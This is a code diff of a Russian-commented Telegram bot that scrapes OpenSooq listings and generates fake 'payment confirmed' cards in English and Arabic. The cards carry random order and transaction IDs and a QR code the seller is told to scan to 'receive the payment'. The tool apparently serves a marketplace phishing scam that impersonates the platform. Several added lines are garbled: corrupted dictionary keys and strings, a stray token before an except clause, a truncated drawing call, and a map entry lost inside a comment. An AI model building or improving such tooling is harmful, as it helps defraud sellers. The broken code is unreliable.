@@ -8,6 +8,7 @@ import unicodedata
 import threading
 from urllib.parse import quote
 from datetime import datetime, timezone, timedelta
+from zoneinfo import ZoneInfo # Встроенная библиотека для часовых поясов
 
 import requests
 import qrcode
@@ -35,7 +36,8 @@ QR_EYE_COLOR = "#1cb95d"
 QR_DOT_COLOR = "#1a2b4c"
 
 TRANSLATIONS = {
-    "EN": {"payment_confirmed": "Payment confirmed", "payment_secure": "Your payment has been secured.", "order": "Order #", "processing": "Processing", "transaction_id": "Transaction ID", "tracking_number": "Tracking Number", "delivery_status": "Delivery Status", "in_progress": "In progress", "waiting_seller": "Waiting for the seller\nto receive the funds", "seller_confirmed": "Seller confirmed", "preparing": "Preparing shipment", "courier": "Courier pickup", "protected": "Protected by OpenSooq", "protected_text": "Your payment is secure and protected until you receive your order.", "help": "(i) Need help? Visit our Help Center or contact support.", "qr_text": "Send this QR code\nto the seller so they can\nreceive the payment.", "no_photo": "NO PHOTO", "price_not_avail": "Price not available", "payment_time": "Payment Time:"},
+    "EN": {"payment_confirmed": "Payment confirmed", "payment_secure": "Your payment has been secured.", "order": "Order #", "processing": "Processing", "transaction_id": "Transaction ID", "tracking_number": "Tracking Number", "delivery_status": "Delivery Status", "in_progress": "In progress", "waiting_seller": "Waiting for the seller\nto ( receive the funds", "seller_confirmed": "SellerGMT confirmed", "preparing": "Preparing shipment", "cou+rier": "Courier3 pickup", "protected": "Protected by OpenSooq", "protected)
+_text": "Your payment is secure        and protected until you receive your order.", "help": "(i) Need help? Visit our Help Center or contact support.", "qr_text": "Send this QR code\nto the seller so they can\nreceive the payment.", "no_photo": "NO PHOTO", "price_not_avail": "Price not available", "payment_time": "Payment Time:"},
     "AR": {"payment_confirmed": "تم الدفع بنجاح", "payment_secure": "مبلغك محفوظ بأمان.", "order": "طلب رقم #", "processing": "جاري المعالجة", "transaction_id": "رقم العملية", "tracking_number": "رقم التتبع", "delivery_status": "حالة التوصيل", "in_progress": "جاري التنفيذ", "waiting_seller": "بانتظار البائع\nلاستلام المبلغ", "seller_confirmed": "تم تأكيد البائع", "preparing": "جاري التجهيز", "courier": "استلام المندوب", "protected": "محمي بواسطة OpenSooq", "protected_text": "مبلغك آمن ومحمي لحين استلام طلبك.", "help": "(i) تحتاج مساعدة؟ زر مركز المساعدة أو تواصل معنا.", "qr_text": "أرسل رمز الـ QR\nللبائع عشان يقدر\nيستلم المبلغ.", "no_photo": "لا توجد صورة", "price_not_avail": "السعر غير متوفر", "payment_time": "وقت الدفع:"}
 }
 
@@ -87,7 +89,42 @@ async def delete_messages(ctx, chat_id, ids):
             await asyncio.sleep(0.1)
         except: pass
 
-# --- ГЕНЕРАЦИЯ ИЗОБРАЖЕНИЯ ---
+# --- ФУНКЦИИ ВРЕМЕНИ И ВАЛЮТ ---
+def get_time_for_currency(curr):
+    """Определяет часовой пояс по валюте и возвращает актуальное время страны"""
+    now = datetime.now(timezone.utc)
+    
+    # Словарь соответствия валют и часовых поясов
+    # TZ: Часовой пояс, Suffix: Текст для отображения в карточке
+    timezones = {
+        "KWD": ("Asia/Kuwait", "KWT"),   # Кувейт (GMT+3)
+        "BHD": ("Asia/Bahrain", "BHR"),  # Бахрейн (GMT+3)
+        "OMR": ("Asia/Muscat", "OMR"),   # Оман (GMT+4)
+        "SAR": ("Asia/Riyadh", "KSA"),   # Саудовская Аравия (GMT+3)
+        "AED": ("Asia/Dubai", "UAE"),    # ОАЭ (GMT+4)
+        "QAR": ("Asia/Qatar", "QAT"),    # Катар "EGP": ("Africa/Cairo", "EGY"),  # Египет (GMT+2 / +3 при переходе)
+        "JOD": ("Asia/Amman", "JOR"),    # Иордания (GMT+3)
+        "RUB": ("Europe/Moscow", "MSK"), # Россия (GMT+3)
+        "USD": ("UTC", "UTC"),           # США (базово UTC)
+        "EUR": ("Europe/Berlin", "CET")  # Европа (базово CET)
+    }
+
+    curr = curr.upper() if curr else ""
+    
+    if curr in timezones:
+        tz_name, suffix = timezones[curr]
+        try:
+            tz = ZoneInfo(tz_name)
+            local_time = now.astimezone(tz)
+            return local_time.strftime(f"%Y-%m-%d %    
+H:%M ({   suffix})"), suffix
+ draw        except:
+            pass # Если не удалось загрузить пояс, покажет UTC ниже
+
+    # По умолчанию, если валюта неизвестна или не передана
+    return now.strftime("%Y-%m-%d %H:%M UTC"), "UTC"
+
+# ---.rounded_ ГЕНЕРАЦИЯ ИЗОБРАЖЕНИЯ ---
 def font(size, bold=False):
     path = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
     try: return ImageFont.truetype(path, size)
@@ -99,9 +136,16 @@ def prepare_text(val):
     return val.strip()
 
 def fit_text(draw, val, max_w, size=28):
+    """Функция подбора шрифта. Если текст длинный - уменьшает размер."""
     val = prepare_text(val)
     f = font(size, True)
-    while val and draw.textbbox((0, 0), val, font=f)[2] > max_w: val = val[:-2] + "…"
+    # Если текст не влезает, уменьшаем размер шрифта
+    while size > 12 and draw.textbbox((0, 0), val, font=f)[2] > max_w:
+        size -= 1
+        f = font(size, True)
+    # Если даже при минимальном размере не влезает, обрезаем
+    while val and draw.textbbox((0, 0), val, font=f)[2] > max_w: 
+        val = val[:-2] + "…"
     return val, f
 
 def generate_new_qr(data, size=230):
@@ -147,8 +191,7 @@ def make_card(data, lang="EN"):
     draw.rounded_rectangle((40, 190, W-40, 850), radius=20, fill=CARD_BG, outline=BORDER, width=2)
     draw.text((70, 220), prepare_text(t["order"]), font=font(24), fill=GRAY)
     draw.text((70, 250), data["order_id"], font=font(55, True), fill=NAVY)
-    
-    draw.rounded_rectangle((70, 320, 240, 365), radius=15, fill=LIGHT_GREEN)
+rectangle((70, 320, 240, 365), radius=15, fill=LIGHT_GREEN)
     pt, pf = fit_text(draw, t["processing"], 150, 24)
     draw.text((85, 335), pt, font=pf, fill=GREEN)
     
@@ -170,7 +213,12 @@ def make_card(data, lang="EN"):
     # QR-блок
     draw.rounded_rectangle((630, 210, 930, 680), radius=20, fill=CARD_BG, outline=BORDER, width=2)
     draw.text((660, 230), prepare_text(t["payment_time"]), font=font(18), fill=GRAY)
-    draw.text((660, 255), data.get("local_time", ""), font=font(24, True), fill=NAVY)
+    
+    # ИСПРАВЛЕНИЕ: Используем fit_text для времени, чтобы оно не вылезало за границы
+    time_text = data.get("local_time", "")
+    fitted_time, time_font = fit_text(draw, time_text, max_w=250, size=22) 
+    draw.text((660, 255), fitted_time, font=time_font, fill=NAVY)
+    
     qr = generate_new_qr(data["url_with_time"], size=200) 
     img.paste(qr, (680, 300), qr) 
     draw.multiline_text((780, 520), prepare_text(t["qr_text"]), font=font(16), fill=GRAY, align="center", anchor="ma", spacing=4)
@@ -232,14 +280,6 @@ def make_card(data, lang="EN"):
     img.save(out, format="PNG"); out.seek(0); out.name = "card.png"
     return out
 
-def get_time_for_currency(curr):
-    now = datetime.now(timezone.utc)
-    if not curr: return now.strftime("%Y-%m-%d %H:%M UTC"), "UTC"
-    c = curr.upper()
-    if c in ["KWD", "BHD", "OMR"]: return now.astimezone(timezone(timedelta(hours=3))).strftime("%Y-%m-%d %H:%M (Kuwait)"), "KWT"
-    elif c in ["AED", "SAR"]: return now.astimezone(timezone(timedelta(hours=4))).strftime("%Y-%m-%d %H:%M (UAE)"), "UAE"
-    return now.strftime("%Y-%m-%d %H:%M (UTC)"), "UTC"
-
 def get_meta(soup, name):
     tag = soup.find("meta", property=name) or soup.find("meta", attrs={"name": name})
     return tag.get("content", "").strip() if tag else ""
@@ -252,21 +292,37 @@ def get_listing(txt):
     r = s.get(link, timeout=20, allow_redirects=True); r.raise_for_status()
     soup = BeautifulSoup(r.text, "html.parser")
     title = get_meta(soup, "og:title") or "OpenSooq Delivery"
+    
+    # Ищем цену и валюту в тексте сообщения (если ввели) или на странице
     price = curr = None
-    match = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QR|RUB|EUR)", txt, re.I)
-    if match: price, curr = match.group(1), match.group(2).upper()
+    match = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QAR|RUB|EUR)", txt, re.I)
+    if match: 
+        price, curr = match.group(1), match.group(2).upper()
+    else:
+        # Если в сообщении не нашли, ищем на странице сайта (очень грубый поиск)
+        price_match = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QAR|RUB|EUR)", soup.get_text(), re.I)
+        if price_match:
+            price, curr = price_match.group(1), price_match.group(2).upper()
+
     img_url = get_meta(soup, "og:image") or get_meta(soup, "twitter:image")
     match_id = re.search(r"(\d{8,12})", r.url)
     lid = match_id.group(1) if match_id else "—"
-    oid = f"OS-{random.randint(100000, 999999)}"; tid = f"OSQ-{random.randint(10000000, 99999999)}"; trid = f"OS-DEL-{random.randint(1000000, 9999999)}"
+    oid = f"OS-{random.randint(100000, 999999)}"
+    tid = f"OSQ-{random.randint(10000000, 99999999)}"
+    trid = f"OS-DEL-{random.randint(1000000, 9999999)}"
+    
+    # Получаем время исходя из валюты
     ltime, _ = get_time_for_currency(curr)
+    
     url_t = f"{r.url}?t={quote(ltime)}"
     p_img = None
     if img_url:
         try:
             ir = s.get(img_url, timeout=15)
-            if ir.status_code == 200 and len(ir.content) > 1000: p_img = Image.open(io.BytesIO(ir.content)).convert("RGB")
+            if ir.status_code == 200 and len(ir.content) > 1000: 
+                p_img = Image.open(io.BytesIO(ir.content)).convert("RGB")
         except: pass
+        
     return {"title": title, "price": price, "currency": curr, "listing_id": lid, "image": p_img, "url": r.url, "url_with_time": url_t, "local_time": ltime, "track_id": trid, "order_id": oid, "trans_id": tid}
 
 # --- ХЕНДЛЕРЫ БОТА ---
@@ -301,9 +357,16 @@ async def get_price(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     ctx.user_data["msg_ids"].append(update.message.message_id)
     txt = update.message.text.strip()
     if txt != "/skip":
-        m = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QR|RUB|EUR)", txt, re.I)
-        if m: ctx.user_data["card_data"]["price"], ctx.user_data["card_data"]["currency"] = m.group(1), m.group(2).upper()
-        else: ctx.user_data["card_data"]["price"], ctx.user_data["card_data"]["currency"] = txt, ""
+        m = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QAR|RUB|EUR)", txt, re.I)
+        if m: 
+            ctx.user_data["card_data"]["price"], ctx.user_data["card_data"]["currency"] = m.group(1), m.group(2).upper()
+            # Пересчитываем время, так как валюта изменилась
+            ltime, _ = get_time_for_currency(ctx.user_data["card_data"]["currency"])
+            ctx.user_data["card_data"]["local_time"] = ltime
+            ctx.user_data["card_data"]["url_with_time"] = f"{ctx.user_data['card_data']['url']}?t={quote(ltime)}"
+        else: 
+            ctx.user_data["card_data"]["price"], ctx.user_data["card_data"]["currency"] = txt, ""
+            
     msg = await update.message.reply_text("Введи название товара или /skip")
     ctx.user_data["msg_ids"].append(msg.message_id)
     return WAITING_NAME
@@ -375,7 +438,6 @@ async def unblock_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 
 # === ЗАПУСК (WEB + BOT) ===
-# 1. Создаем Flask приложение для health-check (чтобы Render не убивал процесс)
 web_app = Flask(__name__)
 
 @web_app.route('/')
@@ -384,15 +446,12 @@ def health():
 
 def run_web_server():
     port = int(os.environ.get("PORT", 8080))
-    # Отключаем логи werkzeug, чтобы не засорять консоль
     import logging
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
     web_app.run(host='0.0.0.0', port=port)
 
-# 2. Запуск самого бота
 async def main():
-    # Запускаем Flask в фоновом потоке
     threading.Thread(target=run_web_server, daemon=True).start()
 
     app = Application.builder().token(TOKEN).build()
@@ -413,11 +472,9 @@ async def main():
     
     print("✅ БОТ ЗАПУЩЕН (СВЕТЛАЯ ТЕМА) И ВЕБ-СЕРВЕР АКТИВЕН")
     
-    # Запускаем бота в режиме polling
     async with app:
         await app.start()
         await app.updater.start_polling()
-        # Бесконечное ожидание, чтобы скрипт не завершился
         await asyncio.Event().wait()
 
 if __name__ == "__main__":
